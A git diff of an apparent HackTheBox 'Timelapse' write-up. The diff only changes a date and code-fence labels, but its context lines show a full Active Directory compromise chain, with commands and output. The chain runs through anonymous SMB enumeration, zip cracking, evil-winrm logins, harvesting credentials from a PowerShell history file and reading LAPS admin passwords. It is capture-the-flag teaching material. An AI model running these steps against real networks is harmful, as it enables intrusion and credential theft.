@@ -1,6 +1,6 @@
 ---
 title: "Timelapse"
-date: 2025-06-20
+date: 2024-11-26
 categories:
   - HackTheBox
   - Active Directory
@@ -16,7 +16,7 @@ tags:
 
 ## Enumeration
 
-```bash
+```shell
 $ nmap -sC -sV -Pn -T4 --min-rate 5000 -p- 10.10.11.152
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-26 10:48 CET
 Nmap scan report for 10.10.11.152
@@ -66,7 +66,7 @@ Nmap done: 1 IP address (1 host up) scanned in 122.68 seconds
 
 Enumerating shares with an empty session, we find a file in `Shares/Dev`
 
-```bash
+```shell
 $ smbclient -U "" -L //10.10.11.152/ -N
 
         Sharename       Type      Comment
@@ -115,7 +115,7 @@ smb: \Dev\> ls
 
 The file has a password, so we use `fcrackzip`
 
-```bash
+```shell
 $ fcrackzip -u  -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
 
 PASSWORD FOUND!!!!: pw == supremelegacy
@@ -135,14 +135,14 @@ Dictionary attack - Thread 1 - Password found: thuglegacy
 
 Now we can extract the private and public keys, knowing this is a `winrm` cert
 
-```bash
+```shell
 $ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out public.crt
 $ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out private.key -nodes
 ```
 
 And try `evil-winrm` with it
 
-```bash
+```shell
 $ evil-winrm -i 10.10.11.152 -c public.crt -k private.key -S
 Evil-WinRM shell v3.7
 
@@ -199,7 +199,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 We find credentials in a PowerShell log file
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 whoami
 ipconfig /all
@@ -215,7 +215,7 @@ exit
 
 So we have `svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV`
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /all
 
 USER INFORMATION
@@ -263,7 +263,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 
 We are in the `LAPS_Readers` group, so we can try to read passwords. Trying with `crackmapexec --laps` doesn't work, so I'll try [thehacker.recipes AD LAPS DACL read](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)
 
-```bash
+```shell
 *Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'                                                                                 
 
 DistinguishedName           : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb                                          
@@ -281,7 +281,7 @@ UserPrincipalName           :
 
 And we have `m{292kr#Es(3K8R7u86t(l$J`. Let's try `evil-winrm` again.
 
-```bash
+```shell
 $ evil-winrm -i 10.10.11.152 -u Administrator -p 'm{292kr#Es(3K8R7u86t(l$J' -S
 
 Evil-WinRM shell v3.7
